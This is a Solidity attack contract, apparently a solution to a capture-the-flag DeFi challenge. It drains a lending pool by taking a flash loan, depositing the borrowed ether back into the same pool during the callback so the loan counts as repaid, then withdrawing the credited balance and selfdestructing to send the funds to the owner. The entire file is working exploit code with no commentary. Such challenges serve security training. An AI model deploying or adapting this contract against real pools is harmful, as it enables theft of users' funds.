// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface sidePool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract attack04 {
    address private pool;
    address private owner;
    constructor (address _pool) payable {
        pool = _pool;
        owner = msg.sender;
    }

    function execute() public payable {
        sidePool(pool).deposit{value: msg.value}();
    }

    function attack_dr(uint256 _amount) public {
        sidePool(pool).flashLoan(_amount);
    }

    function pull() public {
        sidePool(pool).withdraw();
        selfdestruct(payable(owner));
    }

    receive() external payable {}
}
